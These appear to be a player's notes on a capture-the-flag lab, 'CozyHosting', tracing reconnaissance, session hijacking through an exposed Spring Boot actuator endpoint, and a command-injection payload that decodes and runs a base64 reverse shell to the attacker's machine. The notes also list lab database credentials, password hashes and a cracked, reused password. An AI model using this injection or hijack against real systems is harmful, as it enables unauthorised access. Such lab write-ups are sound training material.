**IP Address: 10.129.229.88**

## Recon

#Nmap 

```bash
sudo nmap -T4 -O -sV -sC -p- -oA cozyHosting 10.129.229.88
```

| Port  | Service     | Version          |
| ----- | ----------- | ---------------- |
| 22    | SSH    | OpenSSH 8.9p1 |
| 80    | HTTP   | nginx 1.18.0 |

Navigating to the website on port 80 returns a webpage for a service called "Cozy Hosting"

![[cozyHostingHomepage.png]]

The website seems to be running on BootstrapMade, either using their templates or as a hosting service

![[bootstrapFooter.png]]

I tried to go to the robots.txt page to see if something was there and reached a 404 page listed below.

Given that the page is a "Whitelabel Error Page" it lets me know that the page is running =="Spring Boot" and "Java"==

![[robots404Error.png]]

The below image is interesting because it is giving an error code 999, not sure why this is.

![[whiteLabelError999.png]]

If I click on the logo, which says it is taking me to "http://cozyhosting.htb/index.html" I get a 404 error. This makes me think that the site is not using index.html as its homepage and using a different structure

Looking into the spring boot structure I may be able to exploit this software if it is improperly set up.

I went to the login page to see what I would get and was greeted with a pretty default looking sign in page, but it does not let me create an account on the page or select a forgot password item

![[Images/CozyHosting/loginPage.png]]

I found the version of the template that they are using for the login page in the comments of the site

![[versionOfAdminPage.png]]

I fuzzed the website to search for all of the Spring Boot file structure options and found a listing for "/actuator/sessions" and found a listing for a user with a JSESSION id named kanderson 

![[actuatorSessions.png]]

I was then able to grab that JSESSION id and replace mine with it and login to the admin page at "/admin"

![[websiteStorageArea.png]]

![[kandersonLoggedInAsAdmin.png]]

```
host=127.0.0.1&username=;echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjMvNDQ0NCAwPiYxCg==|base64${IFS}-d|bash;#
```

username:postgres
password:Vg&nvzAQ7XxR

```
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

```

admin:manchesterunited

josh has the same password as the "admin" user

josh:manchesterunited

